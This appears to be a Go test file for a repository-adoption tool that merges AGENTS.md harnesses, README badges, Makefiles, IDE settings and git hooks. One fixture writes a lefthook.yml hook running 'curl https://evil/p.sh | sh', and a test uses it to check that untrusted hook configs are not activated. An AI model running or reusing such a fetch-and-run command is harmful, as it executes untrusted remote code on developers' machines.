		"legacy-footer-no-separator": "# old Agent Operating Harness\n\n## Core Directives & Invariants\nold table\n\n## Primary Verification Commands\n\n```bash\nmake verify-all\n```\n\n# Custom Repo Instructions\nDon't touch this proprietary text!\n",
	}
	for name, initial := range cases {
		repoPath := newTestRepo(t, name)
		mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), initial)

		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
		if err != nil {
			t.Fatalf("%s: Adopt failed: %v", name, err)
		}
		assertNoIssues(t, rep)
		content := mustRead(t, filepath.Join(repoPath, "AGENTS.md"))
		if !strings.Contains(content, "Core Directives & Invariants") {
			t.Errorf("%s: expected updated harness", name)
		}
		if !strings.Contains(content, "# Custom Repo Instructions") || !strings.Contains(content, "Don't touch this proprietary text!") {
			t.Errorf("%s: expected custom repo instructions to be preserved, got:\n%s", name, content)
		}
		// The old harness body is replaced and reported as replaced, the removed line quoted,
		// never passed off as a reconcile (#502).
		if strings.Contains(content, "old table") {
			t.Errorf("%s: the old harness body must be replaced", name)
		}
		if !hasAction(rep, agentsFile, actionReplace) || !strings.Contains(findActionDetail(rep.ActionDetails, agentsFile), `"old table"`) {
			t.Errorf("%s: the replaced harness body must be reported with its removed lines, got %v", name, rep.ActionDetails)
		}

		// A second --force run is idempotent.
		if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true}); err != nil {
			t.Fatalf("%s: second Adopt failed: %v", name, err)
		}
		if again := mustRead(t, filepath.Join(repoPath, "AGENTS.md")); again != content {
			t.Errorf("%s: --force must be idempotent, diff:\n%s\n---\n%s", name, content, again)
		}
	}
}

// TestAdopt_AgentsMD_ForceRefusesUnknownBoundary: without a boundary after the harness start
// the file is left untouched and an error is recorded. A "---" in the preamble, such as front
// matter, is above the harness start and never taken for its boundary.
func TestAdopt_AgentsMD_ForceRefusesUnknownBoundary(t *testing.T) {
	for name, initial := range map[string]string{
		"no separator":            "# Something Agent Operating Harness\nhand written rules without any separator\n",
		"separator only above it": "---\ntitle: rules\n---\n# Something Agent Operating Harness\nhand written rules without any separator\n",
	} {
		repoPath := newTestRepo(t, "unknown-boundary")
		mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), initial)

		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
		if err != nil {
			t.Fatalf("%s: Adopt failed: %v", name, err)
		}
		if got := mustRead(t, filepath.Join(repoPath, "AGENTS.md")); got != initial {
			t.Fatalf("%s: AGENTS.md must be left untouched when the harness boundary is unknown, got:\n%s", name, got)
		}
		if len(rep.Errors) == 0 || !strings.Contains(rep.Errors[0], "AGENTS.md") {
			t.Fatalf("%s: expected a report error naming AGENTS.md, got %v", name, rep.Errors)
		}
	}
}

// harnessAdditionsFixture turns the harness a plain adoption wrote into one a repository
// extended: a preamble in eol line endings above it, the HISS-02 wording edited, two rows of
// its own (one with an escaped pipe) between the catalog rows, and instructions below it.
func harnessAdditionsFixture(t *testing.T, harness, eol string) (edited string, own []string) {
	t.Helper()
	own = []string{
		"| **ACME-01** secrets | never log tokens | review | blocker |",
		`| **ACME-02** paths | allow a \| b only | review | blocker |`,
	}
	var lines []string
	for _, line := range strings.Split(harness, "\n") {
		switch {
		case strings.HasPrefix(line, "| **HISS-02**"):
			line = "| **HISS-02** loops, I/O | loops may run forever | none | ignored |"
		case strings.HasPrefix(line, "| **HISS-01**"):
			line += "\n" + own[0]
		case strings.HasPrefix(line, "| **HISS-05**"):
			line += "\n" + own[1]
		}
		lines = append(lines, line)
	}
	preamble := "<!-- SPDX-FileCopyrightText: 2026 Example Maintainers -->" + eol + "<!-- SPDX-License-Identifier: MIT -->" + eol + eol
	tail := harnessSeparator + "\n# Repository Rules\n\nKeep this.\n"
	return preamble + strings.TrimSpace(strings.Join(lines, "\n")) + "\n" + tail, own
}

// TestAdopt_AgentsMD_ForceKeepsRepositoryAdditions: --force regenerates the harness and keeps
// what the repository added around it: the preamble above the harness start line, rows under
// IDs of its own, appended after the catalog rows in their order and as written (an escaped
// pipe included), and the instructions below it. The edited HISS-02 wording is praetor's, so it
// is replaced and quoted in the replace entry (#502). A second --force is byte-identical.
func TestAdopt_AgentsMD_ForceKeepsRepositoryAdditions(t *testing.T) {
	repoPath := newTestRepo(t, "harness-additions")
	agents := filepath.Join(repoPath, agentsFile)
	opts := AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"}
	if _, err := Adopt(context.Background(), opts); err != nil {
		t.Fatalf("Adopt: %v", err)
	}
	generated := mustRead(t, agents)
	edited, own := harnessAdditionsFixture(t, generated, "\n")
	mustWrite(t, agents, edited)

	opts.Force = true
	rep, err := Adopt(context.Background(), opts)
	if err != nil {
		t.Fatalf("Adopt --force: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, agents)
	if !strings.HasPrefix(content, "<!-- SPDX-FileCopyrightText: 2026 Example Maintainers -->\n<!-- SPDX-License-Identifier: MIT -->\n\n<!-- markdownlint-disable MD013 -->\n") {
		t.Errorf("the preamble must stay above the harness start line:\n%s", content)
	}
	if !strings.HasSuffix(content, "\n---\n\n# Repository Rules\n\nKeep this.\n") {
		t.Errorf("the repository instructions must stay below the harness:\n%s", content)
	}
	last := strings.Index(content, "| **HISS-21**")
	first, second := strings.Index(content, own[0]+"\n"), strings.Index(content, own[1]+"\n")
	if last < 0 || first < last || second < first {
		t.Errorf("own rows must follow the catalog rows in their order (HISS-21 %d, ACME-01 %d, ACME-02 %d):\n%s", last, first, second, content)
	}
	if strings.Contains(content, "loops may run forever") || !strings.Contains(content, "| **HISS-02** loops, I/O | scalar upper bound") {
		t.Errorf("the edited HISS-02 row must be regenerated:\n%s", content)
	}
	detail := findActionDetail(rep.ActionDetails, agentsFile)
	for _, want := range []string{`"| **HISS-02** loops, I/O | loops may run forever | none | ignored |"`, "preamble (3 lines)", "2 repository invariant rows (ACME-01, ACME-02)", "repository-specific instructions"} {
		if !hasAction(rep, agentsFile, actionReplace) || !strings.Contains(detail, want) {
			t.Errorf("replace entry must carry %q, got %q", want, detail)
		}
	}
	if _, err := hisscatalog.ParseGatedInvariants(content); err != nil {
		t.Errorf("refreshed table must stay readable by the wiki parser: %v", err)
	}

	again, err := Adopt(context.Background(), opts)
	if err != nil {
		t.Fatalf("second Adopt --force: %v", err)
	}
	if got := mustRead(t, agents); got != content || hasAction(again, agentsFile, actionReplace) {
		t.Errorf("a second --force must be byte-identical and replace nothing (replace=%v):\n%s", hasAction(again, agentsFile, actionReplace), got)
	}
}

// TestAdopt_AgentsMD_ForceKeepsCRLFPreamble: the harness start is found below a CRLF preamble,
// the preamble survives, the file keeps its CRLF convention, and a second --force is
// byte-identical, for a whole CRLF checkout and for a file whose preamble alone is CRLF.
func TestAdopt_AgentsMD_ForceKeepsCRLFPreamble(t *testing.T) {
	for name, wholeCRLF := range map[string]bool{"crlf checkout": true, "crlf preamble only": false} {
		t.Run(name, func(t *testing.T) {
			repoPath := newTestRepo(t, "harness-crlf")
			agents := filepath.Join(repoPath, agentsFile)
			opts := AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"}
			if _, err := Adopt(context.Background(), opts); err != nil {
				t.Fatalf("Adopt: %v", err)
			}
			edited, own := harnessAdditionsFixture(t, mustRead(t, agents), "\r\n")
			if wholeCRLF {
				edited = strings.ReplaceAll(strings.ReplaceAll(edited, "\r\n", "\n"), "\n", "\r\n")
			}
			mustWrite(t, agents, edited)
			opts.Force = true
			rep, err := Adopt(context.Background(), opts)
			if err != nil {
				t.Fatalf("Adopt --force: %v", err)
			}
			assertNoIssues(t, rep)
			content := mustRead(t, agents)
			if !strings.HasPrefix(content, "<!-- SPDX-FileCopyrightText: 2026 Example Maintainers -->\r\n<!-- SPDX-License-Identifier: MIT -->\r\n\r\n<!-- markdownlint-disable MD013 -->\r\n") {
				t.Errorf("the CRLF preamble must stay above the harness:\n%q", content[:min(len(content), 200)])
			}
			if strings.Count(content, "\n") != strings.Count(content, "\r\n") || !strings.Contains(content, own[1]+"\r\n") {
				t.Errorf("the refreshed file must keep CRLF throughout and the escaped-pipe row as written")
			}
			if _, err := Adopt(context.Background(), opts); err != nil {
				t.Fatalf("second Adopt --force: %v", err)
			}
			if got := mustRead(t, agents); got != content {
				t.Errorf("a second --force must be byte-identical")
			}
		})
	}
}

// TestAdopt_AgentsMD_ForceReplacesRenamedHarnessTitle: a harness whose H1 was renamed is found
// by its invariant heading and opens at that H1, so --force regenerates the whole intro (the
// renamed title quoted in the replace entry) and keeps only the preamble above the title. It
// never keeps the old intro as preamble above a second one, and a second --force is
// byte-identical.
func TestAdopt_AgentsMD_ForceReplacesRenamedHarnessTitle(t *testing.T) {
	repoPath := newTestRepo(t, "harness-renamed")
	agents := filepath.Join(repoPath, agentsFile)
	opts := AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"}
	if _, err := Adopt(context.Background(), opts); err != nil {
		t.Fatalf("Adopt: %v", err)
	}
	generated := mustRead(t, agents)
	title := generated[strings.Index(generated, "\n# ")+1:]
	title = title[:strings.Index(title, "\n")]
	edited, _ := harnessAdditionsFixture(t, strings.Replace(generated, title, "# Our Agent Rules", 1), "\n")
	mustWrite(t, agents, edited)

	opts.Force = true
	rep, err := Adopt(context.Background(), opts)
	if err != nil {
		t.Fatalf("Adopt --force: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, agents)
	for want, count := range map[string]int{"Before concluding any turn:": 1, "<!-- markdownlint-disable MD013 -->": 1, title + "\n": 1, "# Our Agent Rules": 0} {
		if got := strings.Count(content, want); got != count {
			t.Errorf("%q occurs %d times, want %d:\n%s", want, got, count, content)
		}
	}
	if !strings.HasPrefix(content, "<!-- SPDX-FileCopyrightText: 2026 Example Maintainers -->\n<!-- SPDX-License-Identifier: MIT -->\n\n<!-- markdownlint-disable MD013 -->\n"+title+"\n") {
		t.Errorf("the preamble must stay directly above the regenerated harness:\n%s", content)
	}
	if detail := findActionDetail(rep.ActionDetails, agentsFile); !hasAction(rep, agentsFile, actionReplace) || !strings.Contains(detail, `"# Our Agent Rules"`) {
		t.Errorf("the renamed title must be quoted in a replace entry, got %q", detail)
	}
	again, err := Adopt(context.Background(), opts)
	if err != nil {
		t.Fatalf("second Adopt --force: %v", err)
	}
	if got := mustRead(t, agents); got != content || hasAction(again, agentsFile, actionReplace) {
		t.Errorf("a second --force must be byte-identical and replace nothing:\n%s", got)
	}
}

// TestAdopt_AgentsMD_ForceKeepsProseNamingTheHarness: text that only names the harness in
// prose is not a harness, so --force merges the harness above it and keeps every line, rather
// than taking its first "---" for a harness boundary and dropping the text above it.
func TestAdopt_AgentsMD_ForceKeepsProseNamingTheHarness(t *testing.T) {
	repoPath := newTestRepo(t, "harness-prose")
	initial := "# Team Notes\n\nWe follow the Agent Operating Harness idea and the ## Core Directives & Invariants list.\n\n---\n\nKeep all of this.\n"
	mustWrite(t, filepath.Join(repoPath, agentsFile), initial)
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
	if err != nil {
		t.Fatalf("Adopt --force: %v", err)
	}
	content := mustRead(t, filepath.Join(repoPath, agentsFile))
	if !hasAction(rep, agentsFile, actionMerge) || !strings.HasSuffix(content, harnessSeparator+"\n"+initial) {
		t.Errorf("prose naming the harness must be kept whole below a merged harness, got:\n%s", content)
	}
}

func TestHarnessStart(t *testing.T) {
	cases := map[string]struct {
		content string
		want    int
	}{
		"no harness":              {"# Rules\nThe Agent Operating Harness is elsewhere.\n", -1},
		"fenced title":            {"```md\n# x Agent Operating Harness\n```\n", -1},
		"title at the top":        {"# x Agent Operating Harness\n", 0},
		"lint comment above":      {"<!-- SPDX -->\n<!-- markdownlint-disable MD013 MD025 -->\n# x Agent Operating Harness\n", len("<!-- SPDX -->\n")},
		"preamble above title":    {"<!-- SPDX -->\n\n# x Agent Operating Harness\n", len("<!-- SPDX -->\n\n")},
		"renamed title":           {"<!-- SPDX -->\n\n# Rules\n\nBefore concluding any turn:\n\n## Core Directives & Invariants\n", len("<!-- SPDX -->\n\n")},
		"renamed title with lint": {"<!-- SPDX -->\n<!-- markdownlint-disable MD013 -->\n# Rules\n\n## Core Directives & Invariants\n", len("<!-- SPDX -->\n")},
		"nearest title wins":      {"# Project\n\ntext\n\n# Rules\n\n## Core Directives & Invariants\n", len("# Project\n\ntext\n\n")},
		"fenced title skipped":    {"<!-- SPDX -->\n\n# Rules\n\n```sh\n# comment\n```\n\n## Core Directives & Invariants\n", len("<!-- SPDX -->\n\n")},
		"heading without title":   {"<!-- SPDX -->\n\nBefore concluding any turn:\n\n## Core Directives & Invariants\n", 0},
		"lint comment not above":  {"<!-- markdownlint-disable MD041 -->\n\n# Rules\n\n## Core Directives & Invariants\n", len("<!-- markdownlint-disable MD041 -->\n\n")},
	}
	for name, tc := range cases {
		if got := harnessStart(tc.content); got != tc.want {
			t.Errorf("%s: harnessStart = %d, want %d", name, got, tc.want)
		}
	}
}

func TestSplitHarnessTail_Boundary(t *testing.T) {
	if _, tail, ok := splitHarnessTail("no harness here"); ok || tail != "" {
		t.Fatalf("expected no boundary, got ok=%v tail=%q", ok, tail)
	}
	if head, tail, ok := splitHarnessTail("x " + harnessEndMarker); !ok || tail != "" || head != "x " {
		t.Fatalf("marker with empty tail must be ok with empty tail, got ok=%v head=%q tail=%q", ok, head, tail)
	}
	footer := "# h\n" + harnessFooterHeading + "\n```bash\nmake verify-all\n```"
	if head, tail, ok := splitHarnessTail(footer + "\n\n# Rules\n"); !ok || head != footer || tail != "# Rules" {
		t.Fatalf("an older footer ends the head after its closing fence, got ok=%v head=%q tail=%q", ok, head, tail)
	}
	if _, tail, ok := splitHarnessTail("## Primary Verification Commands\n```bash\nunterminated"); ok || tail != "" {
		t.Fatalf("unterminated footer fence must not be a boundary, got ok=%v tail=%q", ok, tail)
	}
	if _, tail, ok := splitHarnessTail("a\n---\n---\nfront matter\n"); !ok || tail != "front matter" {
		t.Fatalf("only one separator is stripped, got ok=%v tail=%q", ok, tail)
	}
}

// =========================================================================
// Governance text and README behaviour
// =========================================================================

func TestAdopt_GovernanceTextsScaffolded(t *testing.T) {
	repoPath := newTestRepo(t, "governance")
	mustWrite(t, filepath.Join(repoPath, "README.md"), "# My Awesome Project\nSome description here.\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	for _, f := range []string{"CONTRIBUTING.md", ".github/pull_request_template.md", "SECURITY.md", "docs/adr/README.md", "docs/adr/0000-template.md"} {
		if !fileExists(filepath.Join(repoPath, f)) {
			t.Errorf("expected %s to be created", f)
		}
	}
	content := mustRead(t, filepath.Join(repoPath, "README.md"))
	if !strings.Contains(content, "HISS%20Adopted%20(baseline%20pending)") || strings.Contains(content, "Compliant") {
		t.Errorf("an unrecorded baseline must render a pending adoption badge, got:\n%s", content)
	}
	if !strings.Contains(content, testReadmeGovernanceStart) || !strings.Contains(content, "# My Awesome Project") {
		t.Errorf("expected managed governance block and preserved heading, got:\n%s", content)
	}
}

func TestAdopt_ReadmeBadgeReflectsBaselinedDebt(t *testing.T) {
	repoPath := newTestRepo(t, "debt-badge")
	mustWrite(t, filepath.Join(repoPath, "README.md"), "# Legacy\n")
	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, RecordBaseline: true})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, filepath.Join(repoPath, "README.md"))
	if strings.Contains(content, "Compliant-brightgreen") {
		t.Errorf("a repository with baselined debt must not claim compliance:\n%s", content)
	}
	if !strings.Contains(content, "1%20baselined") {
		t.Errorf("badge must carry the baselined count, got:\n%s", content)
	}
}

func TestAdopt_ExistingMakefileAppended(t *testing.T) {
	repoPath := newTestRepo(t, "makefile")
	mustWrite(t, filepath.Join(repoPath, "Makefile"), "all:\n\t@echo \"Building...\"\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, filepath.Join(repoPath, "Makefile"))
	for _, want := range []string{"verify-all:", "compile-context:", "all:\n\t@echo \"Building...\""} {
		if !strings.Contains(content, want) {
			t.Errorf("expected Makefile to contain %q", want)
		}
	}
	if !hasAction(rep, "Makefile", actionAppend) {
		t.Errorf("expected an append action for Makefile")
	}
}

func TestBuildMakefile_DetectedCommands(t *testing.T) {
	for _, tc := range []struct{ marker, command string }{
		{"go.mod", "'go' 'test' '-v' '-race' './...'"},
		{"Cargo.toml", "'cargo' 'test' '--locked'"},
	} {
		t.Run(tc.marker, func(t *testing.T) {
			root := t.TempDir()
			mustWrite(t, filepath.Join(root, tc.marker), "")
			plan, err := resolveVerificationPlan(context.Background(), root)
			if err != nil {
				t.Fatal(err)
			}
			if mk := buildMakefile(plan); !strings.Contains(mk, tc.command) {
				t.Errorf("detected toolchain command absent: %s", mk)
			}
			harness, err := buildAgentHarness(adoptedFacts("", "r", "unrelated-governance-profile", plan))
			if err != nil {
				t.Fatal(err)
			}
			if !strings.Contains(harness, tc.command) {
				t.Error("harness and Makefile must advertise the same detected command")
			}
		})
	}
}

// =========================================================================
// IDE configuration behaviour
// =========================================================================

// TestAdopt_EditorsPreservedWithoutForce: a plain run keeps a hand-tuned IDE config; --force
// merges the managed values into it and keeps the adopter's own keys (#502). --force used to
// overwrite the file with the template, dropping every key the adopter had added.
func TestAdopt_EditorsPreservedWithoutForce(t *testing.T) {
	repoPath := newTestRepo(t, "editors")
	custom := "{\n  \"editor.fontSize\": 42\n}\n"
	mustWrite(t, filepath.Join(repoPath, ".vscode", "settings.json"), custom)
	mustWrite(t, filepath.Join(repoPath, ".editorconfig"), "root = true\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if got := mustRead(t, filepath.Join(repoPath, ".vscode", "settings.json")); got != custom {
		t.Fatalf("a hand-tuned IDE config must survive a non-force adopt, got:\n%s", got)
	}
	if !contains(rep.ReconciledFiles, ".vscode/settings.json") {
		t.Errorf("preserved editor file must be reported as reconciled, got %v", rep.ReconciledFiles)
	}

	rep, err = Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
	if err != nil {
		t.Fatalf("Adopt --force failed: %v", err)
	}
	assertNoIssues(t, rep)
	got := mustRead(t, filepath.Join(repoPath, ".vscode", "settings.json"))
	if !strings.Contains(got, `"editor.fontSize": 42`) || !strings.Contains(got, `"standards.sentinel.headroomMB": 1024`) {
		t.Fatalf("--force must merge the managed values and keep the adopter's keys, got:\n%s", got)
	}
	if !hasAction(rep, ".vscode/settings.json", actionMerge) {
		t.Errorf("--force merge must be reported as merge, got %v", rep.ActionDetails)
	}
	if got := mustRead(t, filepath.Join(repoPath, ".editorconfig")); got != "root = true\n" {
		t.Fatal(".editorconfig is user-owned and must survive even --force")
	}
}

// TestAdopt_Force_PreservesDeveloperSessionState covers BUG-024 and BUG-171: --force used to
// replace JetBrains session state and a developer's own Neovim and Emacs setup with templates,
// because adoption kept its own copy of the preservation list and it named only .editorconfig
// and .clang-tidy.
func TestAdopt_Force_PreservesDeveloperSessionState(t *testing.T) {
	repoPath := newTestRepo(t, "editor-state")
	custom := map[string]string{
		".idea/workspace.xml": "<project version=\"4\"><component name=\"RunManager\"/></project>\n",
		".nvim.lua":           "vim.opt.number = true\n",
		".dir-locals.el":      "((nil . ((fill-column . 80))))\n",
	}
	for rel, content := range custom {
		mustWrite(t, filepath.Join(repoPath, filepath.FromSlash(rel)), content)
	}
	mustWrite(t, filepath.Join(repoPath, "lua", "standards.lua"), "-- stale module\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
	if err != nil {
		t.Fatalf("Adopt --force failed: %v", err)
	}
	assertNoIssues(t, rep)
	for rel, content := range custom {
		if got := mustRead(t, filepath.Join(repoPath, filepath.FromSlash(rel))); got != content {
			t.Errorf("%s is developer-owned and must survive --force, got:\n%s", rel, got)
		}
		if !contains(rep.ReconciledFiles, rel) {
			t.Errorf("preserved %s must be reported as reconciled, got %v", rel, rep.ReconciledFiles)
		}
	}
	// Boundary: the Praetor-owned module beside them differs from its template and nothing audits
	// it, so --force keeps it too and warns (#502); deleting it and re-running adopt regenerates it.
	if got := mustRead(t, filepath.Join(repoPath, "lua", "standards.lua")); got != "-- stale module\n" {
		t.Fatalf("--force must keep a drifted lua/standards.lua, got:\n%s", got)
	}
	if !hasWarningContaining(rep, "lua/standards.lua: kept unchanged") {
		t.Errorf("a kept lua/standards.lua must be warned about, got %v", rep.Warnings)
	}
}

// =========================================================================
// Git hook behaviour
// =========================================================================

// Positive and negative: a pre-commit hook praetor did not write is kept on a plain run and,
// since audit requires only that one exists, under --force too: never replaced, never moved to
// pre-commit.bak.
func TestAdopt_Hooks_ForeignPreCommitKeptWithAndWithoutForce(t *testing.T) {
	repoPath := newTestRepo(t, "custom-hook")
	custom := "#!/bin/sh\necho secret-scan\n"
	mustWrite(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit"), custom)

	for _, force := range []bool{false, true} {
		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: force})
		if err != nil {
			t.Fatalf("Adopt (force %v) failed: %v", force, err)
		}
		assertNoIssues(t, rep)
		if got := mustRead(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit")); got != custom {
			t.Fatalf("force %v: existing hook must be kept, got:\n%s", force, got)
		}
		if fileExists(filepath.Join(repoPath, ".git", "hooks", "pre-commit"+hookBackupExt)) {
			t.Fatalf("force %v: the kept hook was copied to pre-commit.bak", force)
		}
		if !hasAction(rep, ".git/hooks/pre-commit", actionSkip) ||
			!strings.Contains(strings.Join(rep.Warnings, "\n"), ".git/hooks/pre-commit: "+foreignPreCommitNote) {
			t.Fatalf("force %v: expected a skip action and the keep warning, got actions=%v warnings=%v",
				force, rep.ActionDetails, rep.Warnings)
		}
	}
}

// Boundary: a pre-commit.bak an earlier adoption left under --force is reported and left as it is.
func TestAdopt_Hooks_LegacyPreCommitBackupReportedNotRemoved(t *testing.T) {
	repoPath := newTestRepo(t, "legacy-hook-backup")
	legacy := filepath.Join(repoPath, ".git", "hooks", "pre-commit"+hookBackupExt)
	mustWrite(t, legacy, "#!/bin/sh\necho old\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if got := mustRead(t, legacy); got != "#!/bin/sh\necho old\n" {
		t.Fatal("adoption changed an earlier pre-commit.bak")
	}
	if !strings.Contains(strings.Join(rep.Warnings, "\n"), ".git/hooks/pre-commit.bak: backup an earlier adoption wrote") {
		t.Fatalf("legacy backup not reported: %v", rep.Warnings)
	}
}

func TestAdopt_Hooks_ForeignLefthookConfigIsNotActivated(t *testing.T) {
	repoPath := newTestRepo(t, "foreign-lefthook")
	mustWrite(t, filepath.Join(repoPath, "lefthook.yml"), "pre-commit:\n  commands:\n    evil:\n      run: curl https://evil/p.sh | sh\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if fileExists(filepath.Join(repoPath, ".git", "hooks", "pre-commit")) {
		t.Fatal("hooks must not be activated for a lefthook.yml praetor did not write")
	}
	if !hasAction(rep, "lefthook.yml", actionSkip) {
		t.Fatalf("expected a skip action for lefthook.yml, got %v", rep.ActionDetails)
	}
}

func TestAdopt_Hooks_LefthookInstallHonoursHooksPath(t *testing.T) {
	stubDir := t.TempDir()
	// The stub installs the hook where git says hooks live, like real lefthook does.
	writeStub(t, stubDir, "lefthook", "d=$(git rev-parse --git-path hooks) && '"+stubMkdir(t)+"' -p \"$d\" && printf '#!/bin/sh\\n# lefthook stub\\n' > \"$d/pre-commit\"\n")
	hermeticPath(t, stubDir)
	repoPath := filepath.Join(t.TempDir(), "hookspath")
	if err := os.MkdirAll(repoPath, 0o755); err != nil {
		t.Fatal(err)
	}
	initTestGit(t, repoPath)
	mustWrite(t, filepath.Join(repoPath, ".git", "config"), "[core]\n\thooksPath = .husky\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if !fileExists(filepath.Join(repoPath, ".husky", "pre-commit")) {
		t.Fatal("hook must land in the core.hooksPath directory")
	}
	if !contains(rep.CreatedFiles, ".husky/pre-commit") {
		t.Fatalf("report must name the real hook path, got %v", rep.CreatedFiles)
	}
}

func TestAdopt_Hooks_FallbackHonoursHooksPath(t *testing.T) {
	repoPath := newTestRepo(t, "fallback-hookspath")
	mustWrite(t, filepath.Join(repoPath, ".git", "config"), "[core]\n\thooksPath = .husky\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if !strings.Contains(mustRead(t, filepath.Join(repoPath, ".husky", "pre-commit")), fallbackPreCommitMarker) {
		t.Fatal("fallback hook must land in the core.hooksPath directory")
	}
	if fileExists(filepath.Join(repoPath, ".git", "hooks", "pre-commit")) {
		t.Fatal("no hook may be written to the ignored .git/hooks directory")
	}
}

func TestAdopt_Hooks_GitlinkWorktreeUsesCommonHooksDir(t *testing.T) {
	main := newTestRepo(t, "main-repo")
	worktree := filepath.Join(t.TempDir(), "wt")
	if err := os.MkdirAll(worktree, 0o755); err != nil {
		t.Fatal(err)
	}
	// Emulate `git worktree add`: a gitlink pointing at .git/worktrees/wt with commondir.
	wtGitDir := filepath.Join(main, ".git", "worktrees", "wt")
	mustWrite(t, filepath.Join(wtGitDir, "HEAD"), "ref: refs/heads/main\n")
	mustWrite(t, filepath.Join(wtGitDir, "commondir"), "../..\n")
	mustWrite(t, filepath.Join(wtGitDir, "gitdir"), filepath.Join(worktree, ".git")+"\n")
	mustWrite(t, filepath.Join(worktree, ".git"), "gitdir: "+wtGitDir+"\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: worktree})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if !strings.Contains(mustRead(t, filepath.Join(main, ".git", "hooks", "pre-commit")), fallbackPreCommitMarker) {
		t.Fatalf("worktree hooks live in the main repository's hooks dir; report=%v", rep.ActionDetails)
	}
}

func TestResolveGitHooksDir_Negative_EscapingDiscoveryIsRefused(t *testing.T) {
	outer := newTestRepo(t, "outer")
	inner := filepath.Join(outer, "inner")
	// A HEAD-only .git is not a repository: git discovery walks up to outer.
	mustWrite(t, filepath.Join(inner, ".git", "HEAD"), "ref: refs/heads/main\n")

	_, err := ResolveGitHooksDir(context.Background(), inner)
	if !errors.Is(err, ErrHooksDirEscapesRepo) {
		t.Fatalf("expected ErrHooksDirEscapesRepo, got %v", err)
	}

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: inner})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	if len(rep.Errors) == 0 || !strings.Contains(rep.Errors[0], "git hooks") {
		t.Fatalf("hook installation into a foreign repository must be reported, got %v", rep.Errors)
	}
	if fileExists(filepath.Join(outer, ".git", "hooks", "pre-commit")) {
		t.Fatal("no hook may be written into the enclosing repository")
	}
}

func TestResolveGitHooksDir_Boundary_NotARepository(t *testing.T) {
	requireGit(t)
	if _, err := ResolveGitHooksDir(context.Background(), t.TempDir()); err == nil {
		t.Fatal("expected an error outside any repository")
	}
}

// =========================================================================
// Scaffold content
// =========================================================================

func TestBuildLefthookYAML_FailsClosed(t *testing.T) {
	cfg := buildLefthookYAML()
	if strings.Contains(cfg, "|| true") {
		t.Fatal("no governance command may swallow its exit status")
	}
	if strings.Contains(cfg, "block_evasion") {
		t.Fatal("the evasion interceptor cannot observe git commands and must not be a lefthook hook")
	}
	var parsed map[string]any
	if err := yamlUnmarshal([]byte(cfg), &parsed); err != nil {
		t.Fatalf("scaffolded lefthook.yml must be valid YAML: %v", err)
	}
	pre, ok := parsed["pre-commit"].(map[string]any)
	if !ok {
		t.Fatal("missing pre-commit section")
	}
	cmds, ok := pre["commands"].(map[string]any)
	if !ok {
		t.Fatal("missing pre-commit commands")
	}
	audit, ok := cmds["hiss-audit"].(map[string]any)
	if !ok {
		t.Fatal("missing hiss-audit command")
	}
	run, isString := audit["run"].(string)
	if !isString || run != lefthookGovernedCommand("audit") {
		t.Fatalf("run line must survive YAML parsing verbatim, got %q", run)
	}
